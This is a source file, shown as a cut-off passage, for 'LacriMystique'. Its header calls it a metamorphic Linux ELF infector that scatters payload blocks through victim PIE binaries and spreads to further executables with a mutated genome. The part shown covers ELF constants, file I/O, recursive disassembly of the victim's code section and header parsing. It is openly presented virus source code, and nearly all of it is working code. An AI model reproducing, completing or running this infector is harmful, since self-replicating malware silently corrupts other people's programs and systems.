// lacrimystique.mc - LacriMystique ELF code integration engine
//
// Linux ELF equivalent of MystiqueFall. Disassembles a victim PIE (ET_DYN)
// ELF binary's .text section, scatters payload basic blocks through victim
// code using Mistfall insertion model, reassembles a working ELF.
// Inspired by herm1t's Lacrimae ELF infector.
//
// The infected victim carries the full Mystique backend and can infect other
// PIE ELFs via --infect <path>. Each infection recompiles with a mutated genome.

#include "../../../compiler/backend/stdlib.mc"
#include "../integrator_common.mc"

// =============================================================================
// File Layout
// =============================================================================
//   1. ELF Constants & Flags (header offsets, dyn tags, ELF-specific FL_*)
//   2. ELF Helpers (bitfield/hash utilities)
//   3. File I/O (Linux open/read/write/close)
//   4. ELF Disassembly (recursive descent into a CodeNode chain)
//   5. ELF Parsing (validate, load_elf_info, build_reloc_map)
//   6. ELF Reassembly (build_elf — emits the new ELF from the mixed chain)
//   7. Reloc & Fixup Passes (remap_va + 14 fixup functions)
//   8. Symbol/Import & Syscall Wrappers (libc-style stubs for the engine API table)
//   9. Scatter & Infect (entry preloader, infect_elf)
//  10. Main
// =============================================================================

// =============================================================================
//
// ELF Constants Module
//
// =============================================================================

// ELF header (Elf32_Ehdr) field offsets — 52 bytes total
int EI_NIDENT       = 16;
int ELF_EHDR_SZ     = 52;
int E_TYPE_OFF       = 16;    // e_type (u16)
int E_MACHINE_OFF    = 18;    // e_machine (u16)
int E_VERSION_OFF    = 20;    // e_version (u32)
int E_ENTRY_OFF      = 24;    // e_entry (u32)
int E_PHOFF_OFF      = 28;    // e_phoff (u32)
int E_SHOFF_OFF      = 32;    // e_shoff (u32)
int E_FLAGS_OFF      = 36;    // e_flags (u32)
int E_EHSIZE_OFF     = 40;    // e_ehsize (u16)
int E_PHENTSIZE_OFF  = 42;    // e_phentsize (u16)
int E_PHNUM_OFF      = 44;    // e_phnum (u16)
int E_SHENTSIZE_OFF  = 46;    // e_shentsize (u16)
int E_SHNUM_OFF      = 48;    // e_shnum (u16)
int E_SHSTRNDX_OFF   = 50;    // e_shstrndx (u16)

// Program header (Elf32_Phdr) field offsets — 32 bytes total
int ELF_PHDR_SZ     = 32;
int P_TYPE_OFF       = 0;     // p_type (u32)
int P_OFFSET_OFF     = 4;     // p_offset (u32)
int P_VADDR_OFF      = 8;     // p_vaddr (u32)
int P_PADDR_OFF      = 12;    // p_paddr (u32)
int P_FILESZ_OFF     = 16;    // p_filesz (u32)
int P_MEMSZ_OFF      = 20;    // p_memsz (u32)
int P_FLAGS_OFF      = 24;    // p_flags (u32)
int P_ALIGN_OFF      = 28;    // p_align (u32)

// Section header (Elf32_Shdr) field offsets — 40 bytes total
int ELF_SHDR_SZ     = 40;
int SH_NAME_OFF      = 0;     // sh_name (u32)
int SH_TYPE_OFF      = 4;     // sh_type (u32)
int SH_FLAGS_OFF     = 8;     // sh_flags (u32)
int SH_ADDR_OFF      = 12;    // sh_addr (u32)
int SH_OFFSET_OFF    = 16;    // sh_offset (u32)
int SH_SIZE_OFF      = 20;    // sh_size (u32)
int SH_LINK_OFF      = 24;    // sh_link (u32)
int SH_INFO_OFF      = 28;    // sh_info (u32)
int SH_ADDRALIGN_OFF = 32;    // sh_addralign (u32)
int SH_ENTSIZE_OFF   = 36;    // sh_entsize (u32)

// Symbol table entry (Elf32_Sym) — 16 bytes total
int ELF_SYM_SZ      = 16;
int ST_NAME_OFF      = 0;     // st_name (u32)
int ST_VALUE_OFF     = 4;     // st_value (u32)
int ST_SIZE_OFF      = 8;     // st_size (u32)
int ST_INFO_OFF      = 12;    // st_info (u8)
int ST_OTHER_OFF     = 13;    // st_other (u8)
int ST_SHNDX_OFF     = 14;    // st_shndx (u16)

// Relocation entry (Elf32_Rel) — 8 bytes total
int ELF_REL_SZ      = 8;
int R_OFFSET_OFF     = 0;     // r_offset (u32)
int R_INFO_OFF       = 4;     // r_info (u32)

// Dynamic entry (Elf32_Dyn) — 8 bytes total
int ELF_DYN_SZ      = 8;
int D_TAG_OFF        = 0;     // d_tag (i32)
int D_VAL_OFF        = 4;     // d_un.d_val / d_un.d_ptr (u32)

// ELF type constants
int ET_DYN           = 3;     // shared object / PIE
int EM_386           = 3;     // Intel 80386

// Program header types
int PT_NULL          = 0;
int PT_LOAD          = 1;
int PT_DYNAMIC       = 2;
int PT_INTERP        = 3;
int PT_NOTE          = 4;
int PT_PHDR          = 6;
int PT_GNU_STACK     = 0x6474E551;
int PT_GNU_RELRO     = 0x6474E552;

// Program header flags
int PF_X             = 1;
int PF_W             = 2;
int PF_R             = 4;

// Section header types
int SHT_NULL         = 0;
int SHT_PROGBITS     = 1;
int SHT_SYMTAB       = 2;
int SHT_STRTAB       = 3;
int SHT_RELA         = 4;
int SHT_HASH         = 5;
int SHT_DYNAMIC      = 6;
int SHT_NOTE         = 7;
int SHT_NOBITS       = 8;
int SHT_REL          = 9;
int SHT_DYNSYM       = 11;
int SHT_INIT_ARRAY   = 14;
int SHT_FINI_ARRAY   = 15;
int SHT_GNU_VERSYM   = 0x6FFFFFFF;   // SHT_HIOS - 1
int SHT_GNU_VERNEED  = 0x6FFFFFFE;

// Section header flags
int SHF_WRITE        = 1;
int SHF_ALLOC        = 2;
int SHF_EXECINSTR    = 4;

// Relocation types
int R_386_NONE       = 0;
int R_386_32         = 1;
int R_386_GLOB_DAT   = 6;
int R_386_JMP_SLOT   = 7;
int R_386_RELATIVE   = 8;

// Dynamic tags
int DT_NULL          = 0;
int DT_NEEDED        = 1;
int DT_PLTRELSZ      = 2;
int DT_PLTGOT        = 3;
int DT_HASH          = 4;
int DT_STRTAB        = 5;
int DT_SYMTAB        = 6;
int DT_STRSZ         = 10;
int DT_INIT          = 12;
int DT_FINI          = 13;
int DT_REL           = 17;
int DT_RELSZ         = 18;
int DT_JMPREL        = 23;
int DT_INIT_ARRAY    = 25;
int DT_FINI_ARRAY    = 26;
int DT_INIT_ARRAYSZ  = 27;
int DT_FINI_ARRAYSZ  = 28;
int DT_VERSYM        = 0x6FFFFFF0;
int DT_VERNEED       = 0x6FFFFFFE;
int DT_VERNEEDNUM    = 0x6FFFFFFF;

// Symbol binding/type
int STB_GLOBAL       = 1;
int STT_FUNC         = 2;
int STT_SECTION      = 3;
int STV_DEFAULT      = 0;

// Section index constants (parallel arrays)
int SI_INIT          = 0;
int SI_FINI          = 1;
int SI_GOT           = 2;
int SI_GOTPLT        = 3;
int SI_RELDYN        = 4;
int SI_RELPLT        = 5;
int SI_PLT           = 6;
int SI_CTOR          = 7;
int SI_DATA          = 8;
int SI_INTERP        = 9;
int SI_TEXT          = 10;
int SI_HASH          = 11;
int SI_DYNSYM        = 12;
int SI_DYNSTR        = 13;
int SI_DYNAMIC       = 14;
int SI_GNUVERSION    = 15;
int SI_GNUVERSIONR   = 16;
int SI_BSS           = 17;
int SI_FINI_ARRAY    = 18;
int SI_RODATA        = 19;
int SI_DATARELRO     = 20;
int SI_COUNT         = 21;

// ELF-specific CodeNode flags (beyond FL_STOP from integrator_common.mc)

int FL_GOTOFF   = 0x0800;   // GOT-relative data access
int FL_GOTPTR   = 0x1000;   // GOT base address computation
int FL_EXTERN   = 0x2000;   // external PLT call

// =============================================================================
//
// ELF Helpers Module
//
// Bitfield/hash utilities for relocation entries and dynamic symbol tables.
//
// =============================================================================

int elf_r_type(int r_info) {
    return r_info & 0xFF;
}

int elf_r_info(int sym, int type) {
    return (sym << 8) | (type & 0xFF);
}

int elf_st_type(int st_info) {
    return st_info & 0xF;
}

// =============================================================================
//
// File I/O Module
//
// =============================================================================

char* read_file_linux(char* path, int* out_size) {
    int fd;
    int total;
    int cap;
    int n;
    char* buf;
    char* newbuf;
    char tmp[4096];

    fd = open(path, 0);  // O_RDONLY = 0
    if (fd < 0) {
        *out_size = 0;
        return 0;
    }

    cap = 65536;
    buf = malloc(cap);
    total = 0;

    n = read(fd, tmp, 4096);
    while (n > 0) {
        if (total + n > cap) {
            cap = cap * 2;
            newbuf = malloc(cap);
            mem_copy(newbuf, buf, total);
            free(buf);
            buf = newbuf;
        }
        mem_copy(buf + total, tmp, n);
        total = total + n;
        n = read(fd, tmp, 4096);
    }
    close(fd);

    *out_size = total;
    return buf;
}

void write_file_linux(char* path, char* data, int size) {
    int fd;
    int wr;
    // O_WRONLY | O_CREAT | O_TRUNC = 1 | 64 | 512 = 577
    fd = open(path, 577);
    if (fd < 0) {
        print("ERR: cannot create ");
        print(path);
        print("\n");
        return;
    }
    wr = write(fd, data, size);
    close(fd);
}

// =============================================================================
//
// ELF Disassembly Module
//
// Recursive descent into the victim's .text, building a CodeNode chain
// suitable for the scatter pass.
//
// =============================================================================

// Disassemble .text section from entry point using work-stack approach.
// text_data: pointer to .text raw bytes
// text_size: size of .text section
// text_addr: virtual address of .text section
// entry_addr: e_entry virtual address
// mark: byte array of text_size (output: mark[off] = instruction length, 0 = unvisited)
// Returns number of instructions disassembled.
int disassemble_elf_text(char* text_data, int text_size, int text_addr,
                         int entry_addr, char* mark) {
    char* work;
    int top;
    int addr;
    int off;
    int len;
    int flags;
    int target;
    int count;
    int first_byte;
    int modrm_reg;

    // Work stack (WORK_STACK_ENTRIES x 4 bytes = 512KB)
    work = malloc(WORK_STACK_BYTES);
    mem_set(work, 0, WORK_STACK_BYTES);
    top = 0;

    // Push entry point if it's in .text
    if (entry_addr >= text_addr && entry_addr < text_addr + text_size) {
        write_i32(work, 0, entry_addr);
        top = 1;
    }

    count = 0;

    while (top > 0) {
        top = top - 1;
        addr = read_i32(work, top * 4);

        // Walk linearly from this address
        while (addr >= text_addr && addr < text_addr + text_size) {
            off = addr - text_addr;

            // Already visited?
            if ((mark[off] & 0xFF) != 0) { break; }

            // Decode
            flags = 0;
            len = lde(text_data + off, &flags);
            if (len == 0) { break; }
            if (off + len > text_size) { break; }

            // Store instruction length
            mark[off] = len;
            count = count + 1;

            // Indirect JMP (FF /4, /5) — treat as STOP
            first_byte = text_data[off] & 0xFF;
            if (first_byte == 0xFF && len >= 2) {
                modrm_reg = (text_data[off + 1] >> 3) & 7;
                if (modrm_reg == 4) { break; }  // JMP r/m32
                if (modrm_reg == 5) { break; }  // JMP far r/m
            }

            // Branch handling
            if ((flags & 32) != 0) {
                target = get_branch_target(text_data + off, addr);

                if ((flags & 64) != 0) {
                    // Unconditional (JMP): follow target
                    addr = target;
                } else {
                    // Conditional (Jcc, CALL): push target, continue fall-through
                    if (target >= text_addr && target < text_addr + text_size) {
                        if (top < WORK_STACK_ENTRIES && (mark[target - text_addr] & 0xFF) == 0) {
                            write_i32(work, top * 4, target);
                            top = top + 1;
                        }
                    }
                    addr = addr + len;
                }
            } else if ((flags & 64) != 0) {
                // STOP but not REL (RET, HLT)
                break;
            } else {
                // Normal: fall through
                addr = addr + len;
            }
        }
    }

    // Resync pass: scan marked branches for targets not yet visited
    off = 0;
    while (off < text_size) {
        len = mark[off] & 0xFF;
        if (len > 0) {
            flags = 0;
            lde(text_data + off, &flags);
            if ((flags & 32) != 0) {
                target = get_branch_target(text_data + off, text_addr + off);
                if (target >= text_addr && target < text_addr + text_size) {
                    if ((mark[target - text_addr] & 0xFF) == 0 && top < WORK_STACK_ENTRIES) {
                        write_i32(work, top * 4, target);
                        top = top + 1;
                    }
                }
            }
            off = off + len;
        } else {
            off = off + 1;
        }
    }

    // Walk newly discovered targets
    while (top > 0) {
        top = top - 1;
        addr = read_i32(work, top * 4);

        while (addr >= text_addr && addr < text_addr + text_size) {
            off = addr - text_addr;
            if ((mark[off] & 0xFF) != 0) { break; }

            flags = 0;
            len = lde(text_data + off, &flags);
            if (len == 0) { break; }
            if (off + len > text_size) { break; }

            mark[off] = len;
            count = count + 1;

            first_byte = text_data[off] & 0xFF;
            if (first_byte == 0xFF && len >= 2) {
                modrm_reg = (text_data[off + 1] >> 3) & 7;
                if (modrm_reg == 4) { break; }
                if (modrm_reg == 5) { break; }
            }

            if ((flags & 32) != 0) {
                target = get_branch_target(text_data + off, addr);
                if ((flags & 64) != 0) {
                    addr = target;
                } else {
                    if (target >= text_addr && target < text_addr + text_size) {
                        if (top < WORK_STACK_ENTRIES && (mark[target - text_addr] & 0xFF) == 0) {
                            write_i32(work, top * 4, target);
                            top = top + 1;
                        }
                    }
                    addr = addr + len;
                }
            } else if ((flags & 64) != 0) {
                break;
            } else {
                addr = addr + len;
            }
        }
    }

    free(work);
    return count;
}

// Build a CodeNode linked list from mark[] for the ELF .text section.
// reloc_map: byte array where reloc_map[off] != 0 if a .rel.dyn R_386_RELATIVE
//            entry covers that offset in .text (i.e., a 4-byte absolute address starts here).
// Returns head of chain. Node count via *out_count.
struct CodeNode* build_elf_code_chain(char* text_data, int text_size, int text_addr,
                                      char* mark, char* reloc_map, int* out_count) {
    struct CodeNode* head;
    struct CodeNode* tail;
    struct CodeNode* c;
    int off;
    int len;
    int flags;
    int first_byte;
    int modrm_reg;
    int gap_start;
    int gap_len;
    int is_pad;
    int b;
    int j;
    int node_count;

    head = 0;
    tail = 0;
    node_count = 0;

    off = 0;
    while (off < text_size) {
        len = mark[off] & 0xFF;

        if (len > 0) {
            // === Visited instruction ===
            c = new_code_node();
            c->src = malloc(len);
            mem_copy(c->src, text_data + off, len);
            c->flags = FL_SEEN | FL_FREESRC;
            c->len = len;
            c->al = len;
            c->oldrva = text_addr + off;

            // LDE flags for branch/stop classification
            flags = 0;
            lde(text_data + off, &flags);
            if ((flags & 32) != 0) { c->flags = c->flags | FL_BRANCH; }
            if ((flags & 64) != 0) { c->flags = c->flags | FL_STOP; }

            // Indirect JMP -> STOP
            first_byte = text_data[off] & 0xFF;
            if (first_byte == 0xFF && len >= 2) {
                modrm_reg = (text_data[off + 1] >> 3) & 7;
                if (modrm_reg == 4) { c->flags = c->flags | FL_STOP; }
                if (modrm_reg == 5) { c->flags = c->flags | FL_STOP; }
            }

            // Data-as-code: if a reloc entry in preceding 3 bytes extends into
            // this instruction, it's data (absolute address), not a real branch
            if ((c->flags & FL_BRANCH) != 0 && off > 0) {
                j = 1;
                while (j <= 3 && j <= off) {
                    if (reloc_map != 0 && reloc_map[off - j] != 0) {
                        c->flags = c->flags & (~FL_BRANCH);
                        c->flags = c->flags & (~FL_STOP);
                    }
                    j = j + 1;
                }
            }

            // Branch target address
            if ((c->flags & FL_BRANCH) != 0) {
                c->target_rva = get_branch_target(text_data + off, text_addr + off);
            }

            // Reloc annotation: check for .rel.dyn entries covering this node
            if (reloc_map != 0) {
                j = 0;
                while (j < len) {
                    if (reloc_map[off + j] != 0) {
                        c->flags = c->flags | FL_ABSREF;
                        c->arg2 = j;
                        // Read the absolute address value at this offset
                        c->arg1 = read_i32(text_data, off + j);
                    }
                    j = j + 1;
                }
            }

            // Link into chain
            if (head == 0) {
                head = c;
                tail = c;
            } else {
                tail->next = c;
                c->prev = tail;
                tail = c;
            }
            node_count = node_count + 1;
            off = off + len;

        } else {
            // === Unvisited gap: data, alignment, or unreachable code ===
            gap_start = off;
            while (off < text_size && (mark[off] & 0xFF) == 0) {
                off = off + 1;
            }
            gap_len = off - gap_start;

            c = new_code_node();
            c->src = malloc(gap_len);
            mem_copy(c->src, text_data + gap_start, gap_len);
            c->flags = FL_FREESRC;
            c->len = gap_len;
            c->oldrva = text_addr + gap_start;

            // Alignment padding detection (NOP 0x90, INT3 0xCC, or 0x00)
            is_pad = 1;
            j = 0;
            while (j < gap_len) {
                b = text_data[gap_start + j] & 0xFF;
                if (b != 144 && b != 204 && b != 0) {
                    is_pad = 0;
                }
                j = j + 1;
            }
            if (is_pad != 0) {
                c->flags = c->flags | FL_ALIGN;
                c->al = gap_len;
            }

            // Reloc annotation for gaps
            if (reloc_map != 0) {
                j = 0;
                while (j < gap_len) {
                    if (reloc_map[gap_start + j] != 0) {
                        c->flags = c->flags | FL_ABSREF;
                        c->arg2 = j;
                        c->arg1 = read_i32(text_data, gap_start + j);
                    }
                    j = j + 1;
                }
            }

            // Link into chain
            if (head == 0) {
                head = c;
                tail = c;
            } else {
                tail->next = c;
                c->prev = tail;
                tail = c;
            }
            node_count = node_count + 1;
        }
    }

    *out_count = node_count;
    return head;
}

// Explode gap nodes into individual instruction-level CodeNodes via LDE.
// Gap nodes are contiguous byte bundles from undiscovered code regions.
// After explosion, every instruction is its own node — fix_branches can handle all displacements.
struct CodeNode* explode_gap_nodes(struct CodeNode* head, int text_addr, int text_size,
                                    char* reloc_map) {
    struct CodeNode* c;
    struct CodeNode* nxt;
    struct CodeNode* first_new;
    struct CodeNode* last_new;
    struct CodeNode* n;
    struct CodeNode* prev;
    char* gap_data;
    int gap_len;
    int gap_rva;
    int off;
    int len;
    int flags;
    int first_byte;
    int modrm_reg;
    int map_off;
    int is_reloc;
    int j;
    int count;

    count = 0;
    c = head;
    while (c != 0) {
        nxt = c->next;

        // Skip already-decoded nodes and alignment/reloc-marked nodes
        if ((c->flags & FL_SEEN) != 0 || (c->flags & FL_ALIGN) != 0
            || (c->flags & FL_ME) != 0) {
            c = nxt;
            continue;
        }

        // Skip small gap nodes (likely data/padding, not worth exploding)
        if (c->len < 5) {
            c = nxt;
            continue;
        }

        gap_data = c->src;
        gap_len = c->len;
        gap_rva = c->oldrva;

        if (gap_data == 0 || gap_len == 0) {
            c = nxt;
            continue;
        }

        // LDE linear scan: split gap into individual instruction nodes
        first_new = 0;
        last_new = 0;
        off = 0;

        while (off < gap_len) {
            // Check reloc_map: if this byte is part of an absolute address, stop
            is_reloc = 0;
            if (reloc_map != 0) {
                map_off = (gap_rva - text_addr) + off;
                if (map_off >= 0 && map_off < text_size) {
                    j = 0;
                    while (j < 4 && map_off + j < text_size) {
                        if ((reloc_map[map_off + j] & 0xFF) != 0) { is_reloc = 1; }
                        j = j + 1;
                    }
                }
            }

            if (is_reloc != 0) {
                // Emit remainder as raw bytes
                n = new_code_node();
                n->src = gap_data + off;
                n->len = gap_len - off;
                n->oldrva = gap_rva + off;
                n->flags = FL_ABSREF;
                if (first_new == 0) { first_new = n; last_new = n; }
                else { last_new->next = n; n->prev = last_new; last_new = n; }
                break;
            }

            flags = 0;
            len = lde(gap_data + off, &flags);

            if (len == 0 || off + len > gap_len) {
                // LDE failure: emit remainder as raw bytes
                n = new_code_node();
                n->src = gap_data + off;
                n->len = gap_len - off;
                n->oldrva = gap_rva + off;
                if (first_new == 0) { first_new = n; last_new = n; }
                else { last_new->next = n; n->prev = last_new; last_new = n; }
                break;
            }

            // Create individual CodeNode (share src memory — don't FL_FREESRC)
            n = new_code_node();
            n->src = gap_data + off;
            n->len = len;
            n->oldrva = gap_rva + off;

            // Classify
            if ((flags & 32) != 0) { n->flags = n->flags | FL_BRANCH; }
            if ((flags & 64) != 0) { n->flags = n->flags | FL_STOP; }

            // Indirect JMP (FF /4, /5)
            first_byte = gap_data[off] & 0xFF;
            if (first_byte == 0xFF && len >= 2) {
                modrm_reg = (gap_data[off + 1] >> 3) & 7;
                if (modrm_reg == 4 || modrm_reg == 5) { n->flags = n->flags | FL_STOP; }
            }

            // Branch target
            if ((n->flags & FL_BRANCH) != 0) {
                n->target_rva = get_branch_target(gap_data + off, gap_rva + off);
            }

            if (first_new == 0) { first_new = n; last_new = n; }
            else { last_new->next = n; n->prev = last_new; last_new = n; }
            count = count + 1;
            off = off + len;
        }

        // Splice: replace c with first_new..last_new in the main chain
        if (first_new != 0) {
            prev = c->prev;
            if (prev != 0) { prev->next = first_new; }
            else { head = first_new; }
            first_new->prev = prev;
            last_new->next = nxt;
            if (nxt != 0) { nxt->prev = last_new; }
            // Don't free c->src (gap nodes share original text buffer)
            free(c);
        }

        c = nxt;
    }

    if (count > 0) {
        print("  Exploded gap nodes: ");
        print_int(count);
        print(" instructions\n");
    }
    return head;
}

// =============================================================================
//
// ELF Parser Module
//
// validate_elf, load_elf_info (parses headers + section/program tables),
// build_reloc_map (.rel.dyn → byte map), sec_name_eq.
//
// =============================================================================

// ElfInfo: parsed ELF metadata
struct ElfInfo {
    char* data;             // raw file data
    int size;               // file size
    int prelink;            // base VA from first PT_LOAD (0 for non-prelinked)
    int e_entry;            // original entry point
    int e_phoff;            // program header table offset
    int e_phnum;            // number of program headers
    int e_shoff;            // section header table offset
    int e_shnum;            // number of section headers
    int e_shstrndx;         // .shstrtab section index
    // .text info
    int text_shidx;         // section header index of .text (-1 if not found)
    int text_off;           // .text file offset
    int text_size;          // .text section size
    int text_addr;          // .text virtual address
    // Section discovery: flat char* arrays indexed as [si * 4], accessed via read_i32/write_i32
    char* sec_shidx;        // section header index (-1 = not found)
    char* sec_data;         // pointers to malloc'd section data (stored as int)
    char* sec_size;         // section size
    char* sec_addr;         // section virtual address
    char* sec_offset;       // section file offset
    char* sec_orig_size;    // original size (before extension)
    char* sec_orig_addr;    // original VA (before build_elf)
    char* sec_addralign;    // sh_addralign
};

// Validate that data is a PIE ELF32 for i386
int validate_elf(char* data, int size) {
    if (size < 52) { return 0; }
    // Magic: 0x7F 'E' 'L' 'F'
    if ((data[0] & 0xFF) != 127) { return 0; }
    if ((data[1] & 0xFF) != 69) { return 0; }   // 'E'
    if ((data[2] & 0xFF) != 76) { return 0; }   // 'L'
    if ((data[3] & 0xFF) != 70) { return 0; }   // 'F'
    // EI_CLASS = ELFCLASS32
    if ((data[4] & 0xFF) != 1) { return 0; }
    // EI_DATA = ELFDATA2LSB
    if ((data[5] & 0xFF) != 1) { return 0; }
    // e_type = ET_DYN (PIE)
    if (read_i16(data, E_TYPE_OFF) != ET_DYN) { return 0; }
    // e_machine = EM_386
    if (read_i16(data, E_MACHINE_OFF) != EM_386) { return 0; }
    return 1;
}

// Compare section name at shstrtab offset with expected name
int sec_name_eq(char* data, int shstrtab_off, int sh_name, char* expected) {
    int i;
    int a;
    int b;
    i = 0;
    while (expected[i] != 0) {
        a = data[shstrtab_off + sh_name + i] & 0xFF;
        b = expected[i] & 0xFF;
        if (a != b) { return 0; }
        i = i + 1;
    }
    // Check that the section name also terminates here
    if ((data[shstrtab_off + sh_name + i] & 0xFF) != 0) { return 0; }
    return 1;
}

// Initialize ElfInfo: parse headers and discover sections
int load_elf_info(struct ElfInfo* ei) {
    int i;
    int sh_off;
    int sh_name;
    int sh_type;
    int sh_flags;
    int sh_addr;
    int sh_offset;
    int sh_size;
    int sh_addralign;
    int shstrtab_off;
    int shstrtab_shoff;
    int ph_off;
    int p_type;
    int p_offset;
    int p_vaddr;

    // Read ELF header fields
    ei->e_entry = read_i32(ei->data, E_ENTRY_OFF);
    ei->e_phoff = read_i32(ei->data, E_PHOFF_OFF);
    ei->e_shoff = read_i32(ei->data, E_SHOFF_OFF);
    ei->e_phnum = read_i16(ei->data, E_PHNUM_OFF);
    ei->e_shnum = read_i16(ei->data, E_SHNUM_OFF);
    ei->e_shstrndx = read_i16(ei->data, E_SHSTRNDX_OFF);

    // Find prelink base: first PT_LOAD with p_offset == 0
    ei->prelink = 0;
    i = 0;
    while (i < ei->e_phnum) {
        ph_off = ei->e_phoff + i * ELF_PHDR_SZ;
        p_type = read_i32(ei->data, ph_off + P_TYPE_OFF);
        p_offset = read_i32(ei->data, ph_off + P_OFFSET_OFF);
        p_vaddr = read_i32(ei->data, ph_off + P_VADDR_OFF);
        if (p_type == PT_LOAD && p_offset == 0) {
            ei->prelink = p_vaddr;
        }
        i = i + 1;
    }

    // Allocate section discovery arrays
    ei->sec_shidx = malloc(SI_COUNT * 4);
    ei->sec_data = malloc(SI_COUNT * 4);
    ei->sec_size = malloc(SI_COUNT * 4);
    ei->sec_addr = malloc(SI_COUNT * 4);
    ei->sec_offset = malloc(SI_COUNT * 4);
    ei->sec_orig_size = malloc(SI_COUNT * 4);
    ei->sec_orig_addr = malloc(SI_COUNT * 4);
    ei->sec_addralign = malloc(SI_COUNT * 4);
    i = 0;
    while (i < SI_COUNT) {
        write_i32(ei->sec_shidx, i * 4, -1);
        write_i32(ei->sec_data, i * 4, 0);
        write_i32(ei->sec_size, i * 4, 0);
        write_i32(ei->sec_addr, i * 4, 0);
        write_i32(ei->sec_offset, i * 4, 0);
        write_i32(ei->sec_orig_size, i * 4, 0);
        write_i32(ei->sec_addralign, i * 4, 0);
        i = i + 1;
    }

    ei->text_shidx = -1;
    ei->text_off = 0;
    ei->text_size = 0;
    ei->text_addr = 0;

    // Locate .shstrtab for section name lookups
    if (ei->e_shstrndx == 0 || ei->e_shstrndx >= ei->e_shnum) {
        print("ERR: invalid e_shstrndx\n");
        return 0;
    }
    shstrtab_shoff = ei->e_shoff + ei->e_shstrndx * ELF_SHDR_SZ;
    shstrtab_off = read_i32(ei->data, shstrtab_shoff + SH_OFFSET_OFF);

    // Iterate section headers and discover sections by name
    i = 0;
    while (i < ei->e_shnum) {
        sh_off = ei->e_shoff + i * ELF_SHDR_SZ;
        sh_name = read_i32(ei->data, sh_off + SH_NAME_OFF);
        sh_type = read_i32(ei->data, sh_off + SH_TYPE_OFF);
        sh_flags = read_i32(ei->data, sh_off + SH_FLAGS_OFF);
        sh_addr = read_i32(ei->data, sh_off + SH_ADDR_OFF);
        sh_offset = read_i32(ei->data, sh_off + SH_OFFSET_OFF);
        sh_size = read_i32(ei->data, sh_off + SH_SIZE_OFF);
        sh_addralign = read_i32(ei->data, sh_off + SH_ADDRALIGN_OFF);

        // Match by name
        if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".text")) {
            ei->text_shidx = i;
            ei->text_off = sh_offset;
            ei->text_size = sh_size;
            ei->text_addr = sh_addr;
            write_i32(ei->sec_shidx, SI_TEXT * 4, i);
            write_i32(ei->sec_size, SI_TEXT * 4, sh_size);
            write_i32(ei->sec_addr, SI_TEXT * 4, sh_addr);
            write_i32(ei->sec_offset, SI_TEXT * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_TEXT * 4, sh_size);
            write_i32(ei->sec_addralign, SI_TEXT * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".init")) {
            write_i32(ei->sec_shidx, SI_INIT * 4, i);
            write_i32(ei->sec_size, SI_INIT * 4, sh_size);
            write_i32(ei->sec_addr, SI_INIT * 4, sh_addr);
            write_i32(ei->sec_offset, SI_INIT * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_INIT * 4, sh_size);
            write_i32(ei->sec_addralign, SI_INIT * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".fini")) {
            write_i32(ei->sec_shidx, SI_FINI * 4, i);
            write_i32(ei->sec_size, SI_FINI * 4, sh_size);
            write_i32(ei->sec_addr, SI_FINI * 4, sh_addr);
            write_i32(ei->sec_offset, SI_FINI * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_FINI * 4, sh_size);
            write_i32(ei->sec_addralign, SI_FINI * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".plt")) {
            write_i32(ei->sec_shidx, SI_PLT * 4, i);
            write_i32(ei->sec_size, SI_PLT * 4, sh_size);
            write_i32(ei->sec_addr, SI_PLT * 4, sh_addr);
            write_i32(ei->sec_offset, SI_PLT * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_PLT * 4, sh_size);
            write_i32(ei->sec_addralign, SI_PLT * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".got")) {
            write_i32(ei->sec_shidx, SI_GOT * 4, i);
            write_i32(ei->sec_size, SI_GOT * 4, sh_size);
            write_i32(ei->sec_addr, SI_GOT * 4, sh_addr);
            write_i32(ei->sec_offset, SI_GOT * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_GOT * 4, sh_size);
            write_i32(ei->sec_addralign, SI_GOT * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".got.plt")) {
            write_i32(ei->sec_shidx, SI_GOTPLT * 4, i);
            write_i32(ei->sec_size, SI_GOTPLT * 4, sh_size);
            write_i32(ei->sec_addr, SI_GOTPLT * 4, sh_addr);
            write_i32(ei->sec_offset, SI_GOTPLT * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_GOTPLT * 4, sh_size);
            write_i32(ei->sec_addralign, SI_GOTPLT * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".rel.dyn")) {
            write_i32(ei->sec_shidx, SI_RELDYN * 4, i);
            write_i32(ei->sec_size, SI_RELDYN * 4, sh_size);
            write_i32(ei->sec_addr, SI_RELDYN * 4, sh_addr);
            write_i32(ei->sec_offset, SI_RELDYN * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_RELDYN * 4, sh_size);
            write_i32(ei->sec_addralign, SI_RELDYN * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".rel.plt")) {
            write_i32(ei->sec_shidx, SI_RELPLT * 4, i);
            write_i32(ei->sec_size, SI_RELPLT * 4, sh_size);
            write_i32(ei->sec_addr, SI_RELPLT * 4, sh_addr);
            write_i32(ei->sec_offset, SI_RELPLT * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_RELPLT * 4, sh_size);
            write_i32(ei->sec_addralign, SI_RELPLT * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".dynsym")) {
            write_i32(ei->sec_shidx, SI_DYNSYM * 4, i);
            write_i32(ei->sec_size, SI_DYNSYM * 4, sh_size);
            write_i32(ei->sec_addr, SI_DYNSYM * 4, sh_addr);
            write_i32(ei->sec_offset, SI_DYNSYM * 4, sh_offset);
            write_i32(ei->sec_orig_size, SI_DYNSYM * 4, sh_size);
            write_i32(ei->sec_addralign, SI_DYNSYM * 4, sh_addralign);
        } else if (sec_name_eq(ei->data, shstrtab_off, sh_name, ".dynstr")) {
            write_i32(ei->sec_shidx, SI_DYNSTR * 4, i);
            write_i32(ei->sec_size, SI_DYNSTR * 4, sh_size);
